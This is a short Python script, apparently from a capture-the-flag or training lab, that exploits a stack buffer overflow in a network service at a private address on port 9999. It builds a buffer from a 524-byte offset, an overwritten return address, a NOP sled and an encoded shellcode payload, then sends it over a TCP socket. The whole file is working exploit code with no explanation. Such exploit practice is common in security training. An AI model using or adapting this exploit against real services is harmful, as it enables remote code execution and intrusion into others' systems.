import socket
import os

ip = "10.10.122.81"
port = 9999

# bad chars = \x0a

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = (
  "\xbf\x6b\x16\x43\x6b\xd9\xe5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
  "\x12\x31\x7d\x12\x03\x7d\x12\x83\x86\xea\xa1\x9e\x69\xc8\xd1"
  "\x82\xda\xad\x4e\x2f\xde\xb8\x90\x1f\xb8\x77\xd2\xf3\x1d\x38"
  "\xec\x3e\x1d\x71\x6a\x38\x75\x88\x81\xb5\xb2\xe4\x9b\xc9\xad"
  "\xa8\x12\x28\x7d\x36\x75\xfa\x2e\x04\x76\x75\x31\xa7\xf9\xd7"
  "\xd9\x56\xd5\xa4\x71\xcf\x06\x64\xe3\x66\xd0\x99\xb1\x2b\x6b"
  "\xbc\x85\xc7\xa6\xbf"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(buffer + "\n", "latin-1"))
  #s.recv(1024)
  s.close()
except:
  print("Could not connect.")
